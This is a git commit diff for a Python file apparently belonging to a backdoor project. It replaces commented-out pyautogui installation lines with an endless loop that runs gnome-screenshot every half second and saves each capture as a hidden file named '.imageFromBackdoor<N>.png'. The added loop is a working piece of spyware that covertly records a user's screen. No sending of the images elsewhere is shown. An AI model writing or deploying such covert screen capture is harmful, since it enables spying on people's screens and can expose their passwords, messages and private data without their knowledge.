7ca8ccb2ac9086928dae86c8bcc4a00fff434b96
Gustavo Scarenci <gustavomourascarenci@usp.br>
2023-06-28 09:08:40 -0300

    python code that takes screenshot updated

--- src/screenshotUserSpace.py
+++ src/screenshotUserSpace.py
@@ -1,12 +1,20 @@
 import os
+import time
 
-os.system("sudo apt install python3-pip")
-os.system("python3 -m pip install pyautogui")
-os.system("pip3 install pyautogui")
-os.system("sudo apt-get install scrot")
-os.system("sudo apt-get install python3-tk")
-os.system("sudo apt-get install python3-dev")
+#TENTANDO USAR PYATUOGUI (NÃO FUNCIONA!)
 
-import pyautogui
+#os.system("sudo apt install python3-pip")
+#os.system("python3 -m pip install pyautogui")
+#os.system("pip3 install pyautogui")
+#os.system("sudo apt-get install scrot")
+#os.system("sudo apt-get install python3-tk")
+#os.system("sudo apt-get install python3-dev")
+#import pyautogui
+#im = pyautogui.screenshot('my_screenshot.png')
 
-im2 = pyautogui.screenshot('my_screenshot.png')
+count = 0
+while(True):
+    count += 1
+    os.system("gnome-screenshot -f .imageFromBackdoor" + str(count) + ".png")
+    time.sleep(0.5)
+
